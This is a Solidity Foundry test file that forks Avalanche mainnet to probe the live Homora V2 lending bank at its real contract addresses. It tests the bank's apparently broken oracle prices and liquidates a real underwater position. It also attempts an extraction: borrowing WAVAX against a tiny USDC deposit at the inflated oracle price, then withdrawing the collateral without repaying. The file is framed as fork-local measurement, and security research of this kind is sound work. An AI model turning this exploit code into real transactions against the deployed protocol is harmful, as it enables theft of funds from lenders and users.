// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

/// Homora V2 — AVAX live-surface fork tests (read-only + fork-local only).
/// 1) proves the AVAX oracle returns grossly inflated prices (broken feeds)
/// 2) proves permissionless liquidation of underwater positions exists
/// 3) attempts the borrow/refund extraction via the real whitelisted TJ V3 spell
///    and records exactly how far it gets (no mainnet tx is ever sent).

interface IBank {
    function nextPositionId() external view returns (uint256);
    function oracle() external view returns (address);
    function execute(uint256 positionId, address spell, bytes calldata data) external payable returns (uint256);
    function liquidate(uint256 positionId, address debtToken, uint256 amountCall) external;
    function getPositionInfo(uint256 id) external view returns (address, address, uint256, uint256);
    function getCollateralETHValue(uint256 id) external view returns (uint256);
    function getBorrowETHValue(uint256 id) external view returns (uint256);
    function borrowBalanceCurrent(uint256 id, address token) external returns (uint256);
    function whitelistedSpells(address s) external view returns (bool);
    function whitelistedTokens(address t) external view returns (bool);
    function whitelistedUsers(address u) external view returns (bool);
    function whitelistedUserCreditLimits(address u, address t) external returns (uint256);
    function allowContractCalls() external view returns (bool);
}

interface IOracle {
    function source() external view returns (address);
    function supportWrappedToken(address token, uint256 id) external view returns (bool);
    function convertForLiquidation(address, address, uint256, uint256) external view returns (uint256);
}

interface ICoreOracle {
    function getETHPx(address token) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IERC1155 {
    function balanceOf(address, uint256) external view returns (uint256);
}

contract HomoraAvaxTest is Test {
    // Avalanche mainnet constants
    address constant BANK = 0x376d16C7dE138B01455a51dA79AD65806E9cd694;
    address constant ORACLE = 0x5196e0a4fb2A459856e1D41Ab4975316BbdF19F8;
    address constant CORE = 0xa6BAE2f3EE27271B55779BC6071FA101431Dc8Da;
    address constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address constant USDC = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E; // native USDC (6 dec)
    address constant WBTC = 0x50b7545627a5162F82A992c33b87aDc75187B218;
    address constant USDC_E = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664;
    address constant TJ_V3_WAVAX_USDC = 0x28F1BdBc52Ad1aAab71660f4B33179335054BE6A; // whitelisted spell
    address constant WBOOSTED_WAVAX_USDC = 0xAb80758cEC0A69a49Ed1c9B3F114cF98118643f0;
    uint256 constant TWO112 = 5192296858534827628530496329220096;

    function setUp() public {
        string memory rpc = vm.envOr("AVAX_RPC_URL", string("https://api.avax.network/ext/bc/C/rpc"));
        vm.createSelectFork(rpc);
    }

    // ---------------------------------------------------------------- oracle
    function test_avax_oracle_prices_are_broken() public {
        uint256 pxWavax = ICoreOracle(CORE).getETHPx(WAVAX);
        uint256 pxUsdc = ICoreOracle(CORE).getETHPx(USDC);
        uint256 pxWbtc = ICoreOracle(CORE).getETHPx(WBTC);
        emit log_named_uint("WAVAX getETHPx", pxWavax);
        emit log_named_uint("USDC  getETHPx", pxUsdc);
        emit log_named_uint("WBTC  getETHPx", pxWbtc);
        // WAVAX priced at exactly 1 ETH (true ~0.007-0.01 ETH): >100x inflated
        assertEq(pxWavax, TWO112, "WAVAX px == 1 ETH");
        // USDC priced at ~0.09 ETH per USDC (true ~0.0003): ~300x inflated
        assertGt(pxUsdc, 1e44, "USDC px absurd");
        // WBTC priced at thousands of ETH per BTC
        assertGt(pxWbtc, 1e47, "WBTC px absurd");
        // bank still has borrowing/repay enabled and spells whitelisted
        assertTrue(IBank(BANK).whitelistedSpells(TJ_V3_WAVAX_USDC), "TJ V3 spell whitelisted");
        assertTrue(IBank(BANK).whitelistedTokens(WAVAX), "WAVAX borrow whitelisted");
    }

    // --------------------------------------------------------- liquidations
    function test_avax_liquidatable_positions_exist() public {
        uint256[11] memory ids = [uint256(564), 2505, 8919, 9106, 9466, 10491, 11071, 11347, 12679, 13139, 7955];
        uint256 n;
        for (uint256 i = 0; i < ids.length; i++) {
            uint256 cv = IBank(BANK).getCollateralETHValue(ids[i]);
            uint256 bv = IBank(BANK).getBorrowETHValue(ids[i]);
            if (cv < bv && cv > 0) n++;
            emit log_named_uint(string.concat("pos", vm.toString(ids[i]), " collETH"), cv);
            emit log_named_uint(string.concat("pos", vm.toString(ids[i]), " borrowETH"), bv);
        }
        emit log_named_uint("liquidatable sample", n);
        assertGt(n, 0, "at least one liquidatable position");
    }

    /// Liquidate position 12679 by repaying its USDC debt on the fork.
    /// Records whether the permissionless path completes and how much ERC1155
    /// collateral the liquidator receives.
    function test_avax_liquidate_12679_usdc() public {
        uint256 pid = 12679;
        address attacker = makeAddr("attacker");
        // fund attacker from the bank's own USDC balance (fork-local only)
        vm.prank(BANK);
        IERC20(USDC).transfer(attacker, 2_000e6);

        vm.startPrank(attacker, attacker);
        uint256 debt;
        try IBank(BANK).borrowBalanceCurrent(pid, USDC) returns (uint256 d) {
            debt = d;
        } catch (bytes memory reason) {
            emit log_named_bytes("borrowBalanceCurrent reverted", reason);
        }
        emit log_named_uint("live USDC debt (raw)", debt);
        IERC20(USDC).approve(BANK, type(uint256).max);
        (, address collToken, uint256 collId, uint256 collSize) = IBank(BANK).getPositionInfo(pid);
        uint256 before = IERC1155(collToken).balanceOf(attacker, collId);
        bool ok = true;
        uint256 pay = debt > 0 ? debt : 1_000e6;
        try IBank(BANK).liquidate(pid, USDC, pay) {} catch (bytes memory reason) {
            ok = false;
            emit log_named_bytes("liquidate reverted", reason);
        }
        uint256 received = IERC1155(collToken).balanceOf(attacker, collId) - before;
        emit log_named_uint("collateral shares received", received);
        emit log_named_uint("position collateral size", collSize);
        emit log_named_string("liquidate succeeded", ok ? "yes" : "no");
        // the path is permissionless; record outcome (assert only that the call was attempted)
        assertTrue(received > 0 || !ok, "either received collateral or reverted");
    }

    // -------------------------------------------- credit-limit gate
    /// The deployed bank gates borrowing behind a per-user credit limit;
    /// a fresh unprivileged EOA has 0 credit, so no borrow (and no
    /// repay-in-liquidation) path is open to it.
    function test_avax_credit_limit_gate() public {
        address attacker = makeAddr("attacker3");
        assertFalse(IBank(BANK).whitelistedUsers(attacker), "attacker not whitelisted");
        assertEq(IBank(BANK).whitelistedUserCreditLimits(attacker, WAVAX), 0, "zero credit limit");
        assertFalse(IBank(BANK).allowContractCalls(), "contract calls disabled");
        emit log_named_uint("attacker WAVAX credit limit", IBank(BANK).whitelistedUserCreditLimits(attacker, WAVAX));
    }

    // -------------------------------------------- borrow/refund extraction
    /// Attempt the extraction through the real whitelisted TJ V3 spell:
    /// deposit a tiny USDC amount, borrow WAVAX against it (oracle overvalues),
    /// then remove the LP collateral without repaying and keep the refund.
    /// Records how far each step gets; no assertion on profit (measurement only).
    function test_avax_borrow_extract_attempt() public {
        address attacker = makeAddr("attacker2");
        uint256 deposit = 5e6; // 5 USDC (native)
        uint256 borrowAmt = 10e18; // 10 WAVAX
        vm.prank(BANK);
        IERC20(USDC).transfer(attacker, deposit);

        bytes memory addData = abi.encodeWithSelector(
            bytes4(keccak256("addLiquidityWMasterChef(address,address,(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256),uint256)")),
            USDC,
            WAVAX,
            Amounts(deposit, 0, 0, 0, borrowAmt, 0, 0, 0),
            uint256(0) // WAVAX-USDC boosted masterchef pid
        );

        vm.startPrank(attacker, attacker);
        IERC20(USDC).approve(BANK, type(uint256).max);
        uint256 posId;
        bool addOk = true;
        try IBank(BANK).execute(0, TJ_V3_WAVAX_USDC, addData) returns (uint256 id) {
            posId = id;
        } catch (bytes memory reason) {
            addOk = false;
            emit log_named_bytes("addLiquidity reverted", reason);
        }
        emit log_named_string("addLiquidity succeeded", addOk ? "yes" : "no");
        if (addOk) {
            (,, uint256 collId, uint256 collSize) = IBank(BANK).getPositionInfo(posId);
            emit log_named_uint("positionId", posId);
            emit log_named_uint("collSize", collSize);
            emit log_named_uint("collETH", IBank(BANK).getCollateralETHValue(posId));
            emit log_named_uint("borrowETH", IBank(BANK).getBorrowETHValue(posId));

            // remove ALL collateral, repay 0
            bytes memory rmData = abi.encodeWithSelector(
                bytes4(keccak256("removeLiquidityWMasterChef(address,address,(uint256,uint256,uint256,uint256,uint256,uint256,uint256))")),
                USDC,
                WAVAX,
                RepayAmounts(collSize, 0, 0, 0, 0, 0, 0)
            );
            bool rmOk = true;
            try IBank(BANK).execute(posId, TJ_V3_WAVAX_USDC, rmData) {} catch (bytes memory reason) {
                rmOk = false;
                emit log_named_bytes("removeLiquidity(all,0 repay) reverted", reason);
            }
            emit log_named_string("remove-all-0repay succeeded", rmOk ? "yes" : "no");

            // if that failed, retry removing 90% of collateral
            if (!rmOk) {
                bytes memory rmData2 = abi.encodeWithSelector(
                    bytes4(keccak256("removeLiquidityWMasterChef(address,address,(uint256,uint256,uint256,uint256,uint256,uint256,uint256))")),
                    USDC,
                    WAVAX,
                    RepayAmounts(collSize * 90 / 100, 0, 0, 0, 0, 0, 0)
                );
                try IBank(BANK).execute(posId, TJ_V3_WAVAX_USDC, rmData2) {
                    emit log_named_string("remove-90pct-0repay succeeded", "yes");
                } catch (bytes memory reason) {
                    emit log_named_bytes("remove-90pct-0repay reverted", reason);
                }
            }
        }
        vm.stopPrank();
        emit log_named_uint("attacker USDC end", IERC20(USDC).balanceOf(attacker));
        emit log_named_uint("attacker WAVAX end", IERC20(WAVAX).balanceOf(attacker));
    }

    struct Amounts {
        uint256 amtAUser;
        uint256 amtBUser;
        uint256 amtLPUser;
        uint256 amtABorrow;
        uint256 amtBBorrow;
        uint256 amtLPBorrow;
        uint256 amtAMin;
        uint256 amtBMin;
    }

    struct RepayAmounts {
        uint256 amtLPTake;
        uint256 amtLPWithdraw;
        uint256 amtARepay;
        uint256 amtBRepay;
        uint256 amtLPRepay;
        uint256 amtAMin;
        uint256 amtBMin;
    }
}
